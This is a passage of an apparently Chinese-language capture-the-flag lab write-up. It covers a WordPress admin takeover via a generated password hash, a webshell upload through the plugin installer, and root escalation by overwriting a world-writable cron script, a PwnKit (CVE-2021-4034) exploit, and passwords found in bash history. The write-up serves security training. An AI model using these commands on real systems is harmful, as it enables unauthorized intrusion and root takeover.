class="variable">$output</span> .= <span class="variable">$itoa64</span>[<span class="variable">$c1</span>];</span><br><span class="line">			<span class="variable">$c1</span> = (<span class="variable">$c2</span> &amp; <span class="number">0x0f</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$c2</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$input</span>[<span class="variable">$i</span>++]);</span><br><span class="line">			<span class="variable">$c1</span> |= <span class="variable">$c2</span> &gt;&gt; <span class="number">6</span>;</span><br><span class="line">			<span class="variable">$output</span> .= <span class="variable">$itoa64</span>[<span class="variable">$c1</span>];</span><br><span class="line">			<span class="variable">$output</span> .= <span class="variable">$itoa64</span>[<span class="variable">$c2</span> &amp; <span class="number">0x3f</span>];</span><br><span class="line">		&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">HashPassword</span>(<span class="params"><span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>( <span class="variable">$password</span> ) &gt; <span class="number">4096</span> ) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$random</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (CRYPT_BLOWFISH == <span class="number">1</span> &amp;&amp; !<span class="variable language_">$this</span>-&gt;portable_hashes) &#123;</span><br><span class="line">			<span class="variable">$random</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_random_bytes</span>(<span class="number">16</span>);</span><br><span class="line">			<span class="variable">$hash</span> =</span><br><span class="line">			    <span class="title function_ invoke__">crypt</span>(<span class="variable">$password</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">gensalt_blowfish</span>(<span class="variable">$random</span>));</span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$hash</span>) == <span class="number">60</span>)</span><br><span class="line">				<span class="keyword">return</span> <span class="variable">$hash</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (CRYPT_EXT_DES == <span class="number">1</span> &amp;&amp; !<span class="variable language_">$this</span>-&gt;portable_hashes) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$random</span>) &lt; <span class="number">3</span>)</span><br><span class="line">				<span class="variable">$random</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_random_bytes</span>(<span class="number">3</span>);</span><br><span class="line">			<span class="variable">$hash</span> =</span><br><span class="line">			    <span class="title function_ invoke__">crypt</span>(<span class="variable">$password</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">gensalt_extended</span>(<span class="variable">$random</span>));</span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$hash</span>) == <span class="number">20</span>)</span><br><span class="line">				<span class="keyword">return</span> <span class="variable">$hash</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$random</span>) &lt; <span class="number">6</span>)</span><br><span class="line">			<span class="variable">$random</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_random_bytes</span>(<span class="number">6</span>);</span><br><span class="line">		<span class="variable">$hash</span> =</span><br><span class="line">		    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">crypt_private</span>(<span class="variable">$password</span>,</span><br><span class="line">		    <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">gensalt_private</span>(<span class="variable">$random</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$hash</span>) == <span class="number">34</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$hash</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment"># Returning &#x27;*&#x27; on error is safe here, but would _not_ be safe</span></span><br><span class="line">		<span class="comment"># in a crypt(3)-like function used _both_ for generating new</span></span><br><span class="line">		<span class="comment"># hashes and for validating passwords against existing hashes.</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">CheckPassword</span>(<span class="params"><span class="variable">$password</span>, <span class="variable">$stored_hash</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>( <span class="variable">$password</span> ) &gt; <span class="number">4096</span> ) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$hash</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">crypt_private</span>(<span class="variable">$password</span>, <span class="variable">$stored_hash</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$hash</span>[<span class="number">0</span>] == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">			<span class="variable">$hash</span> = <span class="title function_ invoke__">crypt</span>(<span class="variable">$password</span>, <span class="variable">$stored_hash</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$hash</span> === <span class="variable">$stored_hash</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hasher</span> = <span class="keyword">new</span> <span class="title class_">PasswordHash</span>( <span class="number">8</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$administrator_password</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="variable">$hashed_password</span> = <span class="variable">$hasher</span>-&gt;<span class="title function_ invoke__">HashPassword</span>(<span class="variable">$administrator_password</span>);</span><br><span class="line"><span class="variable">$trimmed_escaped_hashed_password</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">addslashes</span>(<span class="variable">$hashed_password</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$trimmed_escaped_hashed_password</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得 <code>123456:$P$BwJkLtFsj8XBSLveDQYTfaSFOAkZIq/</code> ，修改</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412101933001.jpg" /></p>
<p>登录 john/123456</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412101934534.jpg" /></p>
<p>经测没法直接编辑主题文件，不过安装主题和插件功能处可直接上传
Shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412102048665.jpg" /></p>
<p>注，点击安装后，会要求输入FTP的登录凭证，此时 shell 已经被传到 upload
下了，无需再管安装问题……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412102049331.jpg" /></p>
<p>Kali 开监听，浏览器访问</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412102052861.jpg" /></p>
<h2 id="提权">9. 提权</h2>
<h3 id="定时任务提权">9.1. 定时任务提权</h3>
<p>查定时任务得 root 每 5 分钟执行 /usr/local/sbin/cron-logrotate.sh
，经查当前用户对该脚本有写权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">www-data@red:/tmp$ <span class="built_in">cat</span> /etc/crontab /etc/cron.d/*</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow user  command</span></span><br><span class="line">17 *    * * *   root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">*/5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># cron.d/mdadm -- schedules periodic redundancy checks of MD devices</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Copyright © martin f. krafft &lt;madduck@madduck.net&gt;</span></span><br><span class="line"><span class="comment"># distributed under the terms of the Artistic Licence 2.0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># By default, run at 00:57 on every Sunday, but do nothing unless the day of</span></span><br><span class="line"><span class="comment"># the month is less than or equal to 7. Thus, only run on the first Sunday of</span></span><br><span class="line"><span class="comment"># each month. crontab(5) sucks, unfortunately, in this regard; therefore this</span></span><br><span class="line"><span class="comment"># hack (see #380425).</span></span><br><span class="line">57 0 * * 0 root <span class="keyword">if</span> [ -x /usr/share/mdadm/checkarray ] &amp;&amp; [ $(<span class="built_in">date</span> +\%d) -le 7 ]; <span class="keyword">then</span> /usr/share/mdadm/checkarray --cron --all --idle --quiet; <span class="keyword">fi</span></span><br><span class="line"><span class="comment"># /etc/cron.d/php@PHP_VERSION@: crontab fragment for PHP</span></span><br><span class="line"><span class="comment">#  This purges session files in session.save_path older than X,</span></span><br><span class="line"><span class="comment">#  where X is defined in seconds as the largest value of</span></span><br><span class="line"><span class="comment">#  session.gc_maxlifetime from all your SAPI php.ini files</span></span><br><span class="line"><span class="comment">#  or 24 minutes if not defined.  The script triggers only</span></span><br><span class="line"><span class="comment">#  when session.save_handler=files.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  WARNING: The scripts tries hard to honour all relevant</span></span><br><span class="line"><span class="comment">#  session PHP options, but if you do something unusual</span></span><br><span class="line"><span class="comment">#  you have to disable this script and take care of your</span></span><br><span class="line"><span class="comment">#  sessions yourself.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Look for and purge old sessions every 30 minutes</span></span><br><span class="line">09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] &amp;&amp; /usr/lib/php/sessionclean</span><br><span class="line">www-data@red:/tmp$      </span><br><span class="line">www-data@red:/tmp$ <span class="built_in">ls</span> -al /usr/local/sbin/cron-logrotate.sh </span><br><span class="line">-rwxrwxrwx 1 root root 89 Dec 10 18:53 /usr/local/sbin/cron-logrotate.sh</span><br><span class="line">www-data@red:/tmp$ </span><br><span class="line">www-data@red:/tmp$ <span class="built_in">cat</span> /usr/local/sbin/cron-logrotate.sh </span><br><span class="line"><span class="comment">#Simon, you really need to-do something about this</span></span><br></pre></td></tr></table></figure>
<p>修改 /usr/local/sbin/cron-logrotate.sh 提权【<a
target="_blank" rel="noopener" href="https://book.hacktricks.xyz/cn/linux-hardening/privilege-escalation#cron-jiao-ben-fu-gai-he-fu-hao-lian-jie">Linux
Privilege Escalation | HackTricks</a>】</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">www-data@red:/usr/local/sbin$ <span class="built_in">echo</span> <span class="string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; cron-logrotate.sh </span><br><span class="line">www-data@red:/usr/local/sbin$    </span><br><span class="line">www-data@red:/usr/local/sbin$ <span class="built_in">cd</span> /tmp/</span><br><span class="line">www-data@red:/tmp$ </span><br><span class="line">www-data@red:/tmp$ <span class="built_in">ls</span> -al bash</span><br><span class="line"><span class="built_in">ls</span>: cannot access <span class="string">&#x27;bash&#x27;</span>: No such file or directory</span><br><span class="line">www-data@red:/tmp$ </span><br><span class="line">www-data@red:/tmp$ <span class="built_in">ls</span> -al bash</span><br><span class="line">-rwsr-sr-x 1 root root 1109520 Dec 10 20:35 bash</span><br><span class="line">www-data@red:/tmp$ </span><br><span class="line">www-data@red:/tmp$ /tmp/bash -p</span><br><span class="line">bash-4.3<span class="comment"># id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) <span class="built_in">groups</span>=0(root),33(www-data)</span><br><span class="line">bash-4.3<span class="comment"># cd /root </span></span><br><span class="line">bash-4.3<span class="comment"># ls -al</span></span><br><span class="line">total 208</span><br><span class="line">drwx------  4 root root  4096 Dec 10 19:27 .</span><br><span class="line">drwxr-xr-x 22 root root  4096 Jun  7  2016 ..</span><br><span class="line">-rw-------  1 root root     1 Jun  5  2016 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  3106 Oct 22  2015 .bashrc</span><br><span class="line">-rw-r--r--  1 root root    50 Jun  3  2016 .my.cnf</span><br><span class="line">-rw-------  1 root root     1 Jun  5  2016 .mysql_history</span><br><span class="line">drwxr-xr-x 11 root root  4096 Jun  3  2016 .oh-my-zsh</span><br><span class="line">-rw-r--r--  1 root root   148 Aug 17  2015 .profile</span><br><span class="line">-rw-------  1 root root  1024 Jun  5  2016 .rnd</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jun  4  2016 .vim</span><br><span class="line">-rw-------  1 root root     1 Jun  5  2016 .viminfo</span><br><span class="line">-rw-r--r--  1 root root 39206 Jun  3  2016 .zcompdump</span><br><span class="line">-rw-r--r--  1 root root 39352 Jun  3  2016 .zcompdump-red-5.1.1</span><br><span class="line">-rw-r--r--  1 root root    17 Jun  3  2016 .zsh-update</span><br><span class="line">-rw-------  1 root root    39 Jun  5  2016 .zsh_history</span><br><span class="line">-rw-r--r--  1 root root  2839 Jun  3  2016 .zshrc</span><br><span class="line">-rwxr-xr-x  1 root root  1090 Jun  5  2016 fix-wordpress.sh</span><br><span class="line">-rw-r--r--  1 root root   463 Jun  5  2016 flag.txt</span><br><span class="line">-rw-r--r--  1 root root   345 Jun  5  2016 issue</span><br><span class="line">-rwxr-xr-x  1 root root   103 Jun  5  2016 python.sh</span><br><span class="line">-rw-r--r--  1 root root 54405 Jun  5  2016 wordpress.sql</span><br><span class="line">bash-4.3<span class="comment"># cat flag.txt</span></span><br><span class="line">~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~</span><br><span class="line">                          .-<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;-.</span></span><br><span class="line"><span class="string">                          |&#x27;</span>-----<span class="string">&#x27;|</span></span><br><span class="line"><span class="string">                          |-.....-|</span></span><br><span class="line"><span class="string">                          |       |</span></span><br><span class="line"><span class="string">                          |       |</span></span><br><span class="line"><span class="string">         _,._             |       |</span></span><br><span class="line"><span class="string">    __.o`   o`&quot;-.         |       |</span></span><br><span class="line"><span class="string"> .-O o `&quot;-.o   O )_,._    |       |</span></span><br><span class="line"><span class="string">( o   O  o )--.-&quot;`O   o&quot;-.`&#x27;</span>-----<span class="string">&#x27;`</span></span><br><span class="line"><span class="string"> &#x27;</span>--------<span class="string">&#x27;  (   o  O    o)  </span></span><br><span class="line"><span class="string">              `----------`</span></span><br><span class="line"><span class="string">b6b545dc11b7a270f4bad23432190c75162c4a2b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bash-4.3#  </span></span><br></pre></td></tr></table></figure>
<p>提权成功，获得 flag</p>
<h3 id="polkit-提权cve-2021-4034">9.2. Polkit 提权（CVE-2021-4034）</h3>
<p>原理分析：[[CVE-2021-4034 pkexec提权漏洞分析]]</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">www-data@red:/tmp/CVE-2021-4034-main$ make</span><br><span class="line">cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c</span><br><span class="line">cc -Wall    cve-2021-4034.c   -o cve-2021-4034</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;module UTF-8// PWNKIT// pwnkit 1&quot;</span> &gt; gconv-modules</span><br><span class="line"><span class="built_in">mkdir</span> -p GCONV_PATH=.</span><br><span class="line"><span class="built_in">cp</span> -f /bin/true GCONV_PATH=./pwnkit.so:.</span><br><span class="line">www-data@red:/tmp/CVE-2021-4034-main$ <span class="built_in">ls</span> -al</span><br><span class="line">total 64</span><br><span class="line">drwxrwxrwx 4 www-data www-data 4096 Dec 10 20:10 .</span><br><span class="line">drwxrwxrwt 9 root     root     4096 Dec 10 20:10 ..</span><br><span class="line">-rw-rw-rw- 1 www-data www-data  114 Jan 30  2022 .gitignore</span><br><span class="line">drwxrwxrwx 2 www-data www-data 4096 Dec 10 20:10 GCONV_PATH=.</span><br><span class="line">-rw-rw-rw- 1 www-data www-data 1071 Jan 30  2022 LICENSE</span><br><span class="line">-rw-rw-rw- 1 www-data www-data  469 Jan 30  2022 Makefile</span><br><span class="line">-rw-rw-rw- 1 www-data www-data 3419 Jan 30  2022 README.md</span><br><span class="line">-rwxrwxrwx 1 www-data www-data 7400 Dec 10 20:10 cve-2021-4034</span><br><span class="line">-rw-rw-rw- 1 www-data www-data  292 Jan 30  2022 cve-2021-4034.c</span><br><span class="line">-rwxr-xr-x 1 www-data www-data  305 Jan 30  2022 cve-2021-4034.sh</span><br><span class="line">drwxrwxrwx 2 www-data www-data 4096 Jan 30  2022 dry-run</span><br><span class="line">-rw-rw-rw- 1 www-data www-data   33 Dec 10 20:10 gconv-modules</span><br><span class="line">-rw-rw-rw- 1 www-data www-data  339 Jan 30  2022 pwnkit.c</span><br><span class="line">-rwxrwxrwx 1 www-data www-data 7180 Dec 10 20:10 pwnkit.so</span><br><span class="line">www-data@red:/tmp/CVE-2021-4034-main$ ./cve-2021-4034</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),33(www-data)</span><br><span class="line"><span class="comment"># cd ~</span></span><br><span class="line">/bin/sh: 2: <span class="built_in">cd</span>: can<span class="string">&#x27;t cd to ~</span></span><br><span class="line"><span class="string"># ls -al</span></span><br><span class="line"><span class="string">total 64</span></span><br><span class="line"><span class="string">drwxrwxrwx 4 www-data www-data 4096 Dec 10 20:10 .</span></span><br><span class="line"><span class="string">drwxrwxrwt 9 root     root     4096 Dec 10 20:10 ..</span></span><br><span class="line"><span class="string">-rw-rw-rw- 1 www-data www-data  114 Jan 30  2022 .gitignore</span></span><br><span class="line"><span class="string">drwxrwxrwx 2 www-data www-data 4096 Dec 10 20:10 GCONV_PATH=.</span></span><br><span class="line"><span class="string">-rw-rw-rw- 1 www-data www-data 1071 Jan 30  2022 LICENSE</span></span><br><span class="line"><span class="string">-rw-rw-rw- 1 www-data www-data  469 Jan 30  2022 Makefile</span></span><br><span class="line"><span class="string">-rw-rw-rw- 1 www-data www-data 3419 Jan 30  2022 README.md</span></span><br><span class="line"><span class="string">-rwxrwxrwx 1 www-data www-data 7400 Dec 10 20:10 cve-2021-4034</span></span><br><span class="line"><span class="string">-rw-rw-rw- 1 www-data www-data  292 Jan 30  2022 cve-2021-4034.c</span></span><br><span class="line"><span class="string">-rwxr-xr-x 1 www-data www-data  305 Jan 30  2022 cve-2021-4034.sh</span></span><br><span class="line"><span class="string">drwxrwxrwx 2 www-data www-data 4096 Jan 30  2022 dry-run</span></span><br><span class="line"><span class="string">-rw-rw-rw- 1 www-data www-data   33 Dec 10 20:10 gconv-modules</span></span><br><span class="line"><span class="string">-rw-rw-rw- 1 www-data www-data  339 Jan 30  2022 pwnkit.c</span></span><br><span class="line"><span class="string">-rwxrwxrwx 1 www-data www-data 7180 Dec 10 20:10 pwnkit.so</span></span><br><span class="line"><span class="string"># cd /root</span></span><br><span class="line"><span class="string"># ls -a</span></span><br><span class="line"><span class="string">.  ..  .bash_history  .bashrc  .my.cnf  .mysql_history  .oh-my-zsh  .profile  .rnd  .vim  .viminfo  .zcompdump                                                                                                                             .zcompdump-red-5.1.1  .zsh-update  .zsh_history  .zshrc  fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql</span></span><br><span class="line"><span class="string"># </span></span><br><span class="line"><span class="string"># /bin/bash</span></span><br><span class="line"><span class="string">root@red:/root# </span></span><br><span class="line"><span class="string">root@red:/root# cat flag.txt </span></span><br><span class="line"><span class="string">~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~</span></span><br><span class="line"><span class="string">                          .-&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span>-.</span><br><span class="line">                          |<span class="string">&#x27;-----&#x27;</span>|</span><br><span class="line">                          |-.....-|</span><br><span class="line">                          |       |</span><br><span class="line">                          |       |</span><br><span class="line">         _,._             |       |</span><br><span class="line">    __.o`   o`<span class="string">&quot;-.         |       |</span></span><br><span class="line"><span class="string"> .-O o `&quot;</span>-.o   O )_,._    |       |</span><br><span class="line">( o   O  o )--.-<span class="string">&quot;`O   o&quot;</span>-.`<span class="string">&#x27;-----&#x27;</span>`</span><br><span class="line"> <span class="string">&#x27;--------&#x27;</span>  (   o  O    o)  </span><br><span class="line">              `----------`</span><br><span class="line">b6b545dc11b7a270f4bad23432190c75162c4a2b</span><br><span class="line"></span><br><span class="line">root@red:/root<span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="password-提权">9.3. Password 提权</h3>
<p>/home/JKanode/.bash_history 下可找到 JKanode 和 peter 的密码，经测
peter 有 sudo 权限可直接提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">www-data@red:/home/JKanode$ <span class="built_in">cat</span> .bash_history </span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">ls</span> -lah</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">ps aux</span><br><span class="line">sshpass -p thisimypassword ssh JKanode@localhost</span><br><span class="line">apt-get install sshpass</span><br><span class="line">sshpass -p JZQuyIN5 peter@localhost</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line"><span class="built_in">kill</span> -9 3747</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">sudo -l</span><br><span class="line">su peter</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">www-data@red:/home/JKanode$ su JKanode</span><br><span class="line">Password: </span><br><span class="line">JKanode@red:~$ <span class="built_in">id</span></span><br><span class="line">uid=1013(JKanode) gid=1013(JKanode) <span class="built_in">groups</span>=1013(JKanode)</span><br><span class="line">JKanode@red:~$ </span><br><span class="line">JKanode@red:~$ <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">www-data@red:/home/JKanode$ su peter</span><br><span class="line">Password: </span><br><span class="line">This is the Z Shell configuration <span class="keyword">function</span> <span class="keyword">for</span> new <span class="built_in">users</span>,</span><br><span class="line">zsh-newuser-install.</span><br><span class="line">You are seeing this message because you have no zsh startup files</span><br><span class="line">(the files .zshenv, .zprofile, .zshrc, .zlogin <span class="keyword">in</span> the directory</span><br><span class="line">~).  This <span class="keyword">function</span> can <span class="built_in">help</span> you with a few settings that should</span><br><span class="line">make your use of the shell easier.</span><br><span class="line"></span><br><span class="line">You can:</span><br><span class="line"></span><br><span class="line">(q)  Quit and <span class="keyword">do</span> nothing.  The <span class="keyword">function</span> will be run again next time.</span><br><span 